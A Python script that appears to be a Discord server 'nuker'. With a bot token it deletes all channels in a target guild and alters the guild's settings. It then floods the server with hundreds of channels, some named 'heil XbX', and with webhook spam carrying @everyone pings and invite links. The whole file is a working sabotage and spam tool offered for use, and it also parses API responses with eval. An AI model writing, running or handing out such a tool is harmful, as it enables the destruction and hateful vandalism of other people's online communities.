import aiohttp
import asyncio
import time
import requests
import json
import threading

null = None
false = False
true = True

discord_api_version = 9
discord_api_base_url = f"https://discord.com/api/v{discord_api_version}"

token = "" #bot token
guild_id = "" #guild to nuke

bot_token = "Bot " + token
headers = {"Authorization": bot_token , 'Content-type': 'application/json'}

def create_channel_with_spam(channel_name):
    try:
        headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
        payload = {"type":0,"name":channel_name,"permission_overwrites":[]}
        r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers , data = json.dumps(payload))
        new_channel_info = eval(r.text)
        new_channel_id = new_channel_info["id"]
        print(f"Created channel {channel_name}")
        
        payload = {"name":"TVC"}
        r = requests.post(f"{discord_api_base_url}/channels/{new_channel_id}/webhooks", headers=headers , data = json.dumps(payload))
        new_webhook_info = eval(r.text)
        new_webhook_id = new_webhook_info["id"]
        new_webhook_token = new_webhook_info["token"]
        new_webhook_url = f"https://discord.com/api/webhooks/{new_webhook_id}/{new_webhook_token}"
        
        message_content = f"@everyone Nuked by TVC | TVC & XbX ontop! | https://discord.gg/JYwBtEp5np | https://discord.gg/cYw8gqj2FX | https://www.youtube.com/@VisionAntiGacha"
        
        for _ in range(30):
            data = {"content" : message_content}
            r = requests.post(new_webhook_url, json = data)
    except:
        pass

def create_channel_weaker(channel_name):
    try:
        headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
        payload = {"type":0,"name":channel_name,"permission_overwrites":[]}
        r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers , data = json.dumps(payload))
        new_channel_info = eval(r.text)
        new_channel_id = new_channel_info["id"]
        print(f"Created a {channel_name} channel")
    except:
        pass

async def delete_channel(session, url):
    async with session.delete(url) as resp:
        try:
            response = await resp.json()
            return response
        except:
            pass

async def nuke(guild_channels):

    data_payload = {
        "description": None,
        "features": ["NEWS"],
        "preferred_locale": "en-US",
        "rules_channel_id": None,
        "public_updates_channel_id": None}

    try:
        r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}" ,headers = headers , json = data_payload)
    except:
        pass

    async with aiohttp.ClientSession(headers=headers) as session:

        tasks = []
        for channel in guild_channels:
            try:
                channel_id = channel["id"]
                url = f"{discord_api_base_url}/channels/{channel_id}"
                tasks.append(asyncio.ensure_future(delete_channel(session, url)))
            except:
                pass

        responses = await asyncio.gather(*tasks)
        for response in responses:
            try:
                name = response["name"]
                id = response["id"]
                print(f"Deleted channel {name} | Id --> {id}")
            except:
                pass

    threads = []

    for x in range(50):
        try:
            thread = threading.Thread(target=create_channel_with_spam, args=("TVC ontop",))
            thread.start()
            threads.append(thread)
        except:
            pass

    for x in range(300):
        try:
            thread = threading.Thread(target=create_channel_weaker, args=("heil XbX",))
            thread.start()
            threads.append(thread)
        except:
            pass

        for thread in threads:
            thread.join()

r = requests.get(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers)
guild_channels = eval(r.text)
asyncio.run(nuke(guild_channels))
